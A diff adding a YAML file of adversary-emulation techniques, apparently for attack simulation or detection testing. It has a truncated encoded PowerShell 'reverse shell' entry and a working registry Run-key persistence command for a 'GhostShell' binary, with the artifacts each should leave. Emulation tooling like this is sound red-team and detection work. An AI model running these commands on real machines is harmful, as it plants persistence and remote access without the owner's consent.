@@ -1,0 +1,21 @@
+- id: T1059.001
+  name: PowerShell Reverse Shell
+  command: powershell -enc SQBFAFgA...
+  sleep: 3-6
+  os: windows
+  tags: [execution, C2]
+  artifacts:
+    - type: eventlog
+      source: GhostShell
+      message: "PowerShell payload executed"
+
+- id: T1112
+  name: Registry Persistence
+  command: reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v GhostShell /d "%APPDATA%\\ghost.exe"
+  sleep: 2-4
+  os: windows
+  tags: [persistence]
+  artifacts:
+    - type: registry
+      key: "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
+      value: GhostShell
